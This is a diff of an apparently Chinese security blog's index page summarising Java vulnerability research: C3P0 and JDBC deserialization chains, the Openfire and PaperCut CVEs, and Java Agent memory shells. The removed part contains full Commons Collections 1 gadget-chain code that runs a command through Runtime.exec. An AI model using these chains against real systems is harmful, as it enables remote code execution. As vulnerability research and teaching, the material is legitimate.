@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="早日退休！"><meta name="keywords" content=""><meta name="author" content="Aizlm,zhikalingm@gmail.com"><meta name="copyright" content="Aizlm"><title>Aizlm</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="只想瘫在操场看月亮"><meta name="keywords" content=""><meta name="author" content="Aizlm,zhikalingm@gmail.com"><meta name="copyright" content="Aizlm"><title>Aizlm</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
   root: '/',
   algolia: undefined,
   localSearch: undefined,
@@ -8,7 +8,7 @@
     noSupport: 'The browser does not support'
   },
   hexoVersion: '6.3.0'
-} </script><meta name="generator" content="Hexo 6.3.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Aizlm</div><div class="author-info__description text-center">早日退休！</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">10</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">5</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Aizlm</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Aizlm</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/13/c3p0%E9%93%BE%E5%88%86%E6%9E%90/">c3p0链分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-13</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span><div class="content"><h1 id="C3P0链分析"><a href="#C3P0链分析" class="headerlink" title="C3P0链分析"></a>C3P0链分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+} </script><meta name="generator" content="Hexo 6.3.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://t7.baidu.com/it/u=3488572215,1738019951&amp;fm=193&amp;f=GIF"></div><div class="author-info__name text-center">Aizlm</div><div class="author-info__description text-center">只想瘫在操场看月亮</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">13</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">5</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Aizlm</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Aizlm</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/13/c3p0%E9%93%BE%E5%88%86%E6%9E%90/">c3p0链分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-13</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span><div class="content"><h1 id="C3P0链分析"><a href="#C3P0链分析" class="headerlink" title="C3P0链分析"></a>C3P0链分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="URLClassLoader链"><a href="#URLClassLoader链" class="headerlink" title="URLClassLoader链"></a>URLClassLoader链</h2><ul>
 <li>gadget：</li>
@@ -69,7 +69,7 @@
 <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/LTianHang/article/details/128909196">https://blog.csdn.net/LTianHang/article/details/128909196</a></li>
 <li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11830">https://xz.aliyun.com/t/11830</a></li>
 </ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/12/%E5%B8%86%E8%BD%AFv10%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">帆软v10漏洞分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-12</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span><div class="content">Here's something encrypted, password is required to continue reading.</div><a class="more" href="/2023/07/12/%E5%B8%86%E8%BD%AFv10%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/06/JNI%E7%BB%95rasp/">JNI绕rasp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-06</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">Java安全基础</a></span><div class="content"><h1 id="RASP"><a href="#RASP" class="headerlink" title="RASP"></a>RASP</h1></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/02/openfire%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/">openfire权限绕过</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span><div class="content"><h1 id="CVE-2023-32315"><a href="#CVE-2023-32315" class="headerlink" title="CVE-2023-32315"></a>CVE-2023-32315</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/12/%E5%B8%86%E8%BD%AFv10%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">帆软v10反序列化分析</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-12</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span><div class="content">Here's something encrypted, password is required to continue reading.</div><a class="more" href="/2023/07/12/%E5%B8%86%E8%BD%AFv10%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#more">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/06/JNI%E7%BB%95rasp/">JNI绕rasp</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-06</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/">Java安全基础</a></span><div class="content"><h1 id="RASP"><a href="#RASP" class="headerlink" title="RASP"></a>RASP</h1></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/02/openfire%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/">openfire权限绕过</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span><div class="content"><h1 id="CVE-2023-32315"><a href="#CVE-2023-32315" class="headerlink" title="CVE-2023-32315"></a>CVE-2023-32315</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol>
 <li>影响版本：<code>3.10.0&lt;=Openfire&lt;4.6.8</code>，<code>4.7.0  &lt;=Openfire&lt;4.7.5</code></li>
 <li>搭建环境：<code>Ubuntu18.04</code>，<code>Openfire4.7.3</code>，其他默认内嵌配置<ul>
 <li>直接运行bin目录下的可执行文件<code>./openfire start</code>，就可以参照网上的文章进行初始化配置了</li>
@@ -112,7 +112,7 @@
 <li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xthnIAC580tnNaQeDgw6qg">https://mp.weixin.qq.com/s/xthnIAC580tnNaQeDgw6qg</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm">https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm</a></li>
 </ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/27/CVE-2023-27350/">javascript引擎漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-27</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span><div class="content"><h1 id="CVE-2023-27350"><a href="#CVE-2023-27350" class="headerlink" title="CVE-2023-27350"></a>CVE-2023-27350</h1><ul>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/29/%E6%9F%90%E7%BD%91%E7%9B%98%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">某网盘漏洞挖掘</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-29</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span><div class="content">Here's something encrypted, password is required to continue reading.</div><a class="more" href="/2023/06/29/%E6%9F%90%E7%BD%91%E7%9B%98%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/#more">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/27/CVE-2023-27350/">javascript引擎漏洞</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-27</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span><div class="content"><h1 id="CVE-2023-27350"><a href="#CVE-2023-27350" class="headerlink" title="CVE-2023-27350"></a>CVE-2023-27350</h1><ul>
 <li><strong>未授权+RCE组合拳</strong></li>
 </ul>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境：ubuntu18.04+papercut22.0.5.63914</p>
@@ -296,7 +296,7 @@
 <img src="/2023/06/27/CVE-2023-27350/image-20230516095623270.png" alt="image-20230516095623270" style="zoom:67%;"></li>
 </ol>
 <h2 id="利用链思路"><a href="#利用链思路" class="headerlink" title="利用链思路"></a>利用链思路</h2><p>这里就是在满足上述反序列化条件下，因为没有CC的依赖，需要构造CB2的base64的字符串，再在<code>sp</code>参数前拼接上<code>O</code>。</p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/15/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC/">Java Agent 内存马</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-15</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></span><div class="content"><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><h3 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h3><ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/25/Smartbi%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">Smartbi漏洞挖掘</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-25</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span><div class="content">Here's something encrypted, password is required to continue reading.</div><a class="more" href="/2023/06/25/Smartbi%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/#more">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/15/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC/">Java Agent 内存马</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-15</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></span><div class="content"><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><h3 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h3><ol>
 <li>定义类，写入agentmain</li>
 </ol>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello I`m agentmain!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -383,7 +383,7 @@
 
 
 
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/05/17/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">JDBC反序列化-Mysql</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-05-17</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span><div class="content"><h1 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h1><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h3><p>$5.1.11\leq$</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/06/12/Epoint%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">Epoint漏洞挖掘</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-06-12</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span><div class="content">Here's something encrypted, password is required to continue reading.</div><a class="more" href="/2023/06/12/Epoint%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/#more">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/05/17/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">JDBC反序列化-Mysql</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-05-17</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span><div class="content"><h1 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h1><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h3><p>$5.1.11\leq$</p>
 <ol>
 <li><p><code>mysql-connector-java-5.1.26</code></p>
 </li>
@@ -530,453 +530,7 @@
 
 
 
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/">常见漏洞审计</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-04-16</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span><div class="content"><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><ul>
-<li>Java代码审计：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44029310/category_11847602.html">https://blog.csdn.net/qq_44029310/category_11847602.html</a></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Common Collections 1,2</span><br><span class="line">Shiro-550、Shiro-721</span><br><span class="line">fastjson &lt;=1.2.24</span><br><span class="line">https://cloud.tencent.com/developer/article/1974944</span><br><span class="line">Log4j2系列 &lt; 2.15.0</span><br><span class="line">https://cloud.tencent.com/developer/article/1917530</span><br></pre></td></tr></table></figure>
-
-<h2 id="Common-Collection-1"><a href="#Common-Collection-1" class="headerlink" title="Common Collection 1"></a>Common Collection 1</h2><ul>
-<li>commons-collections3.1-3.2.1，jdk1.7.1以下</li>
-</ul>
-<ol>
-<li>流程<ol>
-<li>漏洞点：在3.1和jdk1.7.1之前，InvokerTransformer的transform数组可控</li>
-<li>关键点：AnnotationInvocationHandler反序列化，LazyMap+动态代理</li>
-<li>调用链：transform能够被LazyMap的get方法进行调用，LazyMap链的调用是通过AnnotationInvocationHandler类的动态代理实现的，在handler的反序列化readObject中，会调用到memberValues的方法，memberValues设置为LazyMap的实例，因为挂了一层动态代理，所以会调用到LazyMap的invoke方法，invoke方法中调用了memberValues的get方法，接着调用transform，形成调用链。</li>
-</ol>
-</li>
-</ol>
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230215172835361.png">
-
-<p>LazyMap链：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">        Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, transformerChain);</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Target.class, lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler);</span><br><span class="line">annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, proxyMap);</span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(annotationInvocationHandler);</span><br><span class="line">oos.close();</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><ul>
-<li><p>LazyMap类如何构造利用链？</p>
-<p>核心漏洞函数是InvokerTransformer类的transform方法，然后transform可控，是漏洞点。LazyMap需要通过调用本身的get方法继续往下调用到transform，则需要往上找到能够进行反序列化的地方，即怎么调用get方法，通过动态代理利用annotationInvocationHandler的invoke调用到memberValues的get再调用到LazyMap的get方法。</p>
-</li>
-<li><p>需要一个类在反序列化的时候触发LazyMap类的get方法？</p>
-<p>annotationInvocationHandler初始化时，将LazyMap放入到memberValues中，然后触发invoke方法调用memberValues.get方法</p>
-</li>
-<li><p>如何去调用AnnotationInvocationHandler类中的invoke方法？</p>
-<p>将LazyMap通过AnnotationInvocationHandler挂上动态代理，根据动态代理，每个具有代理对象的方法被调用时都会触发invoke方法。</p>
-</li>
-</ul>
-<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3.2.2</span><br><span class="line">FunctorUtils.checkUnsafeSerialization</span><br><span class="line">调用readObject和writeObject的时候把InvokerTransformer类给拉黑了</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Common-Collections-2"><a href="#Common-Collections-2" class="headerlink" title="Common Collections 2"></a>Common Collections 2</h2><ul>
-<li><p>利用过程：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 构造一个TestTemplatesImpl恶意类转成字节码，然后通过反射将恶意类的字节码注入到TemplatesImpl对象的_bytecodes属性（构造利用核心代码）</span><br><span class="line">2. 创建一个InvokerTransformer并传递一个newTransformer方法，然后将InvokerTransformer方法名传递给TransformingComparator（这一步和CC1链非常相似）</span><br><span class="line">3. 通过反射构造PriorityQueue队列的comparator和queue两个字段，将PriorityQueue队列的comparator字段设置为TransformingComparator，然后将queue字段设置为TemplatesImpl对象，触发利用链</span><br></pre></td></tr></table></figure>
-
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230215195859346.png"></li>
-</ul>
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230215202111822.png" style="zoom:80%;">
-
